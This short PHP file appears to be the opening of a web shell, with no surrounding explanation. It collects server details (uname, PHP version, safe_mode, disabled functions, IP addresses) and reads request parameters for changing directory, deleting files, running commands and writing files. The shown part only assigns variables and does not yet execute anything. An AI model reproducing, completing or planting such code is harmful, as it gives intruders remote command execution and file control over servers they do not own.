<?php  

$info = $_SERVER['SERVER_SOFTWARE']; 
$site = getenv("HTTP_HOST"); 
$page = $_SERVER['SCRIPT_NAME']; 
$sname = $_SERVER['SERVER_NAME']; 
$uname = php_uname(); 
$smod = ini_get('safe_mode'); 
$disfunc = ini_get('disable_functions'); 
$yourip = $_SERVER['REMOTE_ADDR']; 
$serverip = $_SERVER['SERVER_ADDR']; 
$version = phpversion(); 
$ccc = realpath($_GET['chdir'])."/"; 
$fdel = $_GET['fdel']; 
$execute = $_POST['execute']; 
$cmd = $_POST['cmd']; 
$commander = $_POST['commander']; 
$ls = "ls -la"; 
$source = $_POST['source']; 
$gomkf = $_POST['gomkf']; 
$title = $_POST['title']; 
$sourcego = $_POST['sourcego']; 

	
?>